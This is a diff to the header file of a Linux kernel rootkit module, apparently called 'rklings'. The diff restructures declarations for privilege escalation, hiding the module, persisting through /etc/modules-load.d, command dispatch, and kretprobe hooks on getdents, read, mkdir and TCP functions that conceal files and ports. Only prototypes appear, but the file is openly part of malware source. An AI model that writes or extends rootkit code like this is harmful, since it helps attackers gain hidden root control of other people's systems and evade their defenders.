@@ -6,12 +6,21 @@
 #include <linux/spinlock.h>
 #include <linux/types.h>
 
-#define RK_TARGET_MAX    32
-#define RK_NAME_MAX      64
-#define PERSIST_PATH     "/etc/modules-load.d/rklings.conf"
-#define MODULE_NAME_STR  "rklings"
+#define RK_TARGET_MAX	32
+#define RK_NAME_MAX	64
+#define RK_CMD_MAX	24
+#define PERSIST_PATH	"/etc/modules-load.d/rklings.conf"
+#define MODULE_NAME_STR "rklings"
+
+/* Command registration */
+
+typedef int (*rk_handler_t)(const char *arg);
+
+int rk_cmd_register(const char *key, rk_handler_t handler);
+int rk_dispatch(const char *name);
 
 /* Target list */
+
 struct rk_target_list {
 	spinlock_t lock;
 	char targets[RK_TARGET_MAX][RK_NAME_MAX];
@@ -24,31 +33,29 @@ extern struct rk_target_list rk_content_targets;
 extern struct rk_target_list rk_port_targets;
 
 void rk_target_init(struct rk_target_list *list);
-int  rk_target_add(struct rk_target_list *list, const char *name);
-int  rk_target_remove(struct rk_target_list *list, int idx);
+int rk_target_add(struct rk_target_list *list, const char *name);
+int rk_target_remove(struct rk_target_list *list, int idx);
 bool rk_target_match(struct rk_target_list *list, const char *name);
 bool rk_line_matches(struct rk_target_list *list, const char *line, int len);
 
-/* Escalation */
-int  rk_escalate(void);
-void rk_set_escalate_pid(pid_t pid);
+/* Subsystem init */
+
+int rk_escalate_init(void);
+int rk_module_cmds_init(void);
+int rk_filter_init(void);
 
 /* Proc interface */
-int  rk_proc_init(void);
+
+int rk_proc_init(void);
 void rk_proc_exit(void);
 
-/* Module cloaking */
-void rk_cloak(void);
-void rk_uncloak(void);
+/* Module hiding */
 
-/* Persistence */
-int  rk_persist(void);
-int  rk_unpersist(void);
+void rk_module_hide(void);
+void rk_module_unhide(void);
 
-/* Command dispatch */
-int  rk_dispatch(const char *cmd);
+/* Probes */
 
-/* Probes (owned by dispatch.c and filter.c) */
 extern struct kretprobe rk_mkdir_probe;
 extern struct kretprobe rk_mkdirat_probe;
 extern struct kretprobe rk_getdents_probe;
@@ -56,4 +63,4 @@ extern struct kretprobe rk_read_probe;
 extern struct kretprobe rk_tcp4_probe;
 extern struct kretprobe rk_tcp6_probe;
 
-#endif /* ROOTKIT_H */
+#endif
